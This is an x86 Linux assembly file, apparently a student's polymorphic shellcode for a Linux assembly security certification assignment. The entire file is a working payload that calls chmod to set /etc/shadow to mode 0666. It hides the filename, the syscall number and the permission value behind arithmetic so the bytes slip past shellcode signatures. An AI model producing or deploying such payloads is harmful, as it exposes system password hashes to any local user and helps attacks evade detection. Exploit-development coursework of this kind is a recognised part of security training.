; Filename:	chmod_poly.nasm
; Author:	aus-mate
; Purpose:	This code was written for assignment #6 of the SecurityTube Linux Assembly Expert certification.
; Student ID:	SLAE-1555

global _start

section .text

_start:
	; xor edx,edx
	; push byte +0xf
	; pop eax
	; push edx
	
	xor ecx, ecx		; clear ecx

	; push 0xf		; attempt to mask syscall number
	push 0xc		; push 0xc onto the stack
	pop eax			; pop 0xc into eax
	add eax, 0x3		; add 0x3 to make syscall value 0xf (chmod)
	
	push ecx                ; push 0s onto the stack

	; push byte +0x77
        ; push word 0x6f64
	; push dword 0x776f6461
	mov esi, 0x25c112b3	; mask /etc//shadow string	
	add esi, 0x51ae51ae
	push esi	

	; push dword 0x68732f2f	
	sub esi, 0xefc3532
	push esi

	; push dword 0x6374652f
	sub esi, 0x4feca01
	inc esi
	push esi

	mov ebx,esp		
	
	push 0x64		; disguise permissions argument
	pop ecx
	add cx, 0x152
	int 0x80
	
	; push byte +0x1	; exit not necessary if we don't mind segfault
	; pop eax			
	; int 0x80

